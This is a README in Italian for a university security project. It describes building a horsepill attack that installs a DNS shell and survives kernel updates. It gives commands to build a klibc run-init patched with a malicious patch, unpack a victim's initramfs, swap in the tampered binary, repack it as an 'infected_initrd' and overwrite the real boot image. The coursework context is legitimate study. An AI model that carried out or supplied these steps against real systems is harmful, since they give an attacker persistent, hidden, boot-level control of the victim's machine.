# Network and System Defence project
## Alessandro Chillotti (mat. 0299824)

## Traccia del progetto (traduzione)
È richiesto produrre un payload (utilizzando qualunque vettore) che è in grado di installare una DNS shell (e.g. guardare [qui](https://github.com/sensepost/DNS-Shell)) utilizzando un horsepill attack. Il payload deve essere in grado di sopravvivere agli update del kernel.

## Svolgimento del progetto
### Costruzione del run-init
Per costruire il binario `run-init` sono necessari i seguenti passaggi:

1. Eseguire il seguente comando per scaricare il sorgente della libreria klibc.
```
sudo apt-get build-dep klibc && apt-get source klibc
```
2. Eseguire il seguente comando per applicare la patch ai file sorgenti scaricati al passo precedente.
```
cd klibc-2.x.x && quilt import klibc-horsepill.patch -f && dpkg-buildpackage -j$(nproc) -us -uc
```
Completati questi due passaggi, sarà stato costruito il binario run-init.
### Costruzione del ramdisk infettato
All'interno della macchina vittima è necessario eseguire i seguenti comandi:

1. È necessario scompattare l'immagine all'interno della directory `boot` ed è stato utilizzato il comando:
```
unmkinitramfs /boot/initrd.img-5.13.0-39-generic dest-dir
```
2. Sostituire il run-init presente nei file che sono stati scompattati con quello creato nella sezione precedente.
3. Eseguire i seguenti comandi per ricompattare i file.
```
# Add the first microcode firmware

cd early
find . -print0 | cpio --null --create --format=newc > /path/to/infected_initrd

# Add the second microcode firmware

cd ../early2
find kernel -print0 | cpio --null --create --format=newc >> /path/to/infected_initrd

# Add the ram fs file system

cd ../main
find . | cpio --create --format=newc | xz --format=lzma >> /path/to/infected_initrd
```
4. Sostituire l'immagine presente all'interno di boot (`initrd.img-5.13.0-39-generic`) con quella appena creata (`infected_initrd`) mantenendo il nome `initrd.img-5.13.0-39-generic`.